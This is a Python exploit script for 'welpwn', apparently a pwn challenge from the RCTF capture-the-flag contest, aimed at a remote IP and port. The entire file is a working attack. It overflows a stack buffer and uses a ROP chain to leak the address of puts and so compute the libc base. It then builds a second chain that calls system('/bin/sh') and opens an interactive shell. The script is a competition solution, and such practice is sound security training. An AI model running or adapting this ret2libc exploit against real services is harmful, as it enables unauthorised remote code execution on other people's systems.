from zio import *

#target = './welpwn'
target = ('180.76.178.48', 6666)

def exp(target):
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
    io.read_until('RCTF\n')

    payload = 'a'*0x10+'\x00'*8

    puts_plt = 0x00000000004005A0
    puts_got = 0x0000000000601018
    pop_rdi_ret = 0x00000000004008A3
    main = 0x00000000004007CD

    rop = l64(pop_rdi_ret)+l64(puts_got)+l64(puts_plt)+l64(main)

    while len(payload)<1024-len(rop):
        payload += rop
    payload = payload.ljust(1024, 'a')
    io.write(payload)

    io.read_until('a'*0x10)

    d = io.read_until('\n').strip('\n')

    puts_addr = l64(d.ljust(8, '\x00'))
    print hex(puts_addr)

    if puts_addr&0xfff != 0xe30:
        return 0

    libc_base = puts_addr- 0x000000000006FE30
    system_addr = libc_base + 0x0000000000046640
    binsh_addr = libc_base + 0x000000000017CCDB

    payload2 = 'a'*0x10+'\x00'*8+'a'*0x10
    print hex(libc_base)

    rop = l64(pop_rdi_ret)+l64(binsh_addr)+l64(system_addr)+l64(main)

    while len(payload2)<1024:
        payload2 += rop

    io.writeline(payload2)

    print 'get shell'
    io.interact()

exp(target)

